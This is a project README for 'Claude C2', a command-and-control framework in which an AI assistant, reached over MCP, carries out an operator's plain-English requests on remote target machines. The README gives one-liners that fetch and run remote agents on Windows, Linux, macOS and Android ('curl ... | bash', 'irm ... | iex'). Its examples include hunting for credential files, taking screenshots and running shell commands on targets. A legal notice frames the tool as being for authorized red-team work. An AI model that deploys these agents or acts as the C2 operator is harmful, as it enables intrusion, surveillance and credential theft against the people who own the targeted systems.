<div align="center">

<img src="https://raw.githubusercontent.com/0xyg3n/claude-c2/main/docs/logo.svg" alt="Claude C2" width="120">

# Claude C2

### AI-Powered Command & Control Framework

[![Platform](https://img.shields.io/badge/Windows%20%7C%20Linux%20%7C%20macOS%20%7C%20Android-blue?style=for-the-badge)](https://github.com/0xyg3n/claude-c2)
[![MCP](https://img.shields.io/badge/Claude-MCP-7C3AED?style=for-the-badge)](https://claude.ai)
[![Node](https://img.shields.io/badge/Node.js-18+-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org)

<br>

<img src="https://raw.githubusercontent.com/0xyg3n/claude-c2/main/docs/demo.gif" alt="Demo" width="700">

<br>

**Natural language control of remote systems through Claude AI and Model Context Protocol**

<br>

[Overview](#overview) · [Architecture](#architecture) · [Installation](#installation) · [Deployment](#deployment) · [Documentation](#documentation)

</div>

<br>

---

<br>

## Overview

Claude C2 is a command and control framework that integrates with Anthropic's Model Context Protocol (MCP), enabling operators to manage remote systems through natural language conversations with Claude AI.

Rather than memorizing command syntax across different operating systems, operators communicate intent in plain English. The AI interprets requests, selects appropriate targets, executes the necessary commands, and returns formatted results.

```
Operator:  "Show me all connected systems"
Claude:    [Queries client manager, returns formatted list with OS, hostname, IP, user context]

Operator:  "Capture the screen on the Windows workstation"
Claude:    [Identifies target, executes screenshot, saves to server, confirms completion]

Operator:  "Search for configuration files containing credentials"
Claude:    [Runs recursive search with appropriate OS commands, returns matching paths]
```

<br>

### Key Characteristics

| Feature | Description |
|:--------|:------------|
| **Natural Language Interface** | Communicate with targets through conversational English |
| **Cross-Platform** | Unified control across Windows, Linux, macOS, and Android |
| **Adaptive Execution** | AI automatically translates intent to OS-specific commands |
| **Minimal Footprint** | Agents use native scripting tools with no additional binaries |
| **Encrypted Transport** | TLS-secured WebSocket connections with OAuth 2.0 authentication |
| **Auto-Recovery** | Agents automatically reconnect on connection loss |

<br>

---

<br>

## Architecture

```
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                            │
│                           CLAUDE C2 ARCHITECTURE                           │
│                                                                            │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│    ┌──────────────┐         ┌──────────────┐         ┌──────────────┐     │
│    │              │         │              │         │              │     │
│    │   OPERATOR   │   MCP   │   COMMAND    │   WSS   │    TARGET    │     │
│    │              │◄───────►│              │◄───────►│              │     │
│    │  Claude.ai   │   SSE   │    SERVER    │  JSON   │    AGENTS    │     │
│    │              │         │              │         │              │     │
│    └──────────────┘         └──────────────┘         └──────────────┘     │
│                                                                            │
│         │                         │                         │             │
│         │  Natural language       │  Command routing        │  Shell      │
│         │  requests/responses     │  Client management      │  execution  │
│         │  via Claude AI          │  OAuth + TLS            │  Results    │
│         │                         │                         │             │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
```

**Communication Flow:**

1. Operator interacts with Claude AI through claude.ai interface
2. Claude connects to C2 server via MCP (Model Context Protocol) over SSE
3. Server maintains persistent WebSocket connections to all deployed agents
4. Commands are routed to appropriate agents based on operator intent
5. Agents execute commands using native OS tools and return results
6. Claude formats and presents results to operator

<br>

---

<br>

## Installation

### Prerequisites

- Node.js 18 or higher
- Valid SSL certificate (Let's Encrypt recommended)
- Domain name pointing to server
- Network access on ports 443, 3101, 3102

### Server Setup

```bash
# Clone repository
git clone https://github.com/0xyg3n/claude-c2.git
cd claude-c2

# Install dependencies
npm install

# Configure environment
cp .env.example .env
```

Edit `.env` with your configuration:

```env
DOMAIN=your-domain.com
MCP_PORT=3101
WS_PORT=3102
OAUTH_CLIENT_ID=your-client-id
OAUTH_CLIENT_SECRET=your-client-secret
SSL_CERT_PATH=/path/to/cert.pem
SSL_KEY_PATH=/path/to/key.pem
```

```bash
# Start server
npm start
```

### Claude.ai Integration

Configure MCP connector in Claude.ai settings:

| Parameter | Value |
|:----------|:------|
| Server URL | `https://your-domain.com/mcp/sse` |
| Authentication | OAuth 2.0 |
| Client ID | Value from `.env` |
| Client Secret | Value from `.env` |

<br>

---

<br>

## Deployment

Deploy agents to target systems using platform-specific one-liners:

<table>
<thead>
<tr>
<th align="center">Platform</th>
<th>Deployment Command</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center"><b>Windows</b></td>
<td>

```powershell
irm https://YOUR_DOMAIN/agent/windows | iex
```

</td>
</tr>
<tr>
<td align="center"><b>Linux</b></td>
<td>

```bash
curl -s https://YOUR_DOMAIN/agent/linux | bash
```

</td>
</tr>
<tr>
<td align="center"><b>macOS</b></td>
<td>

```bash
curl -s https://YOUR_DOMAIN/agent/macos | bash
```

</td>
</tr>
<tr>
<td align="center"><b>Android</b></td>
<td>

```bash
curl -s https://YOUR_DOMAIN/agent/termux | bash
```

</td>
</tr>
</tbody>
</table>

Agents operate in memory without persistence by default. Connection resilience is built-in with automatic reconnection on network interruption.

<br>

---

<br>

## Usage Examples

| Request | Action |
|:--------|:-------|
| `"List all connected clients"` | Display all active agents with system information |
| `"Execute whoami on target"` | Run command and return output |
| `"Take a screenshot"` | Capture display and save to server |
| `"Find all PDF documents"` | Recursive filesystem search |
| `"Show network configuration"` | Execute ipconfig/ifconfig based on OS |
| `"List running processes"` | Display process list with details |
| `"Open URL on Android device"` | Launch browser with specified URL |

When a single agent is connected, Claude automatically selects it. With multiple agents, specify the target by name or identifier.

<br>

---

<br>

## Demonstrated Platforms

<div align="center">

| Windows 11 | Android (Termux) |
|:----------:|:----------------:|
| <img src="https://raw.githubusercontent.com/0xyg3n/claude-c2/main/docs/poc-windows.png" width="320"> | <img src="https://raw.githubusercontent.com/0xyg3n/claude-c2/main/docs/poc-termux.png" width="320"> |
| Full agent functionality | Termux environment with API access |

</div>

<br>

---

<br>

## Documentation

| Document | Description |
|:---------|:------------|
| [Integration Guide](docs/INTEGRATIONS.md) | Claude.ai configuration and API setup |
| [Android Operations](docs/ANDROID-TERMUX.md) | Termux-specific features and Termux:API |

<br>

---

<br>

## Legal Notice

<table>
<tr>
<td>

**This software is provided strictly for authorized security testing, educational research, and legitimate penetration testing engagements.**

By using this software, you acknowledge and agree to the following:

- You have obtained **explicit written authorization** for any systems tested
- You understand that unauthorized access to computer systems is a **criminal offense** under applicable laws including but not limited to the Computer Fraud and Abuse Act (CFAA), Computer Misuse Act, and equivalent legislation in your jurisdiction
- The authors and contributors accept **no responsibility or liability** for any misuse, damage, or illegal activities conducted with this software
- You assume **full legal responsibility** for your use of this software

This tool is intended exclusively for:
- Licensed penetration testers with valid authorization
- Red team operators with written scope agreements
- Security researchers in controlled environments
- Educational purposes in authorized lab settings

</td>
</tr>
</table>

<br>

---

<div align="center">

<sub>

**Claude C2** — Built on Anthropic's Model Context Protocol

</sub>

</div>
# Claude C2 - Updated Mon Dec  8 13:44:11 EET 2025
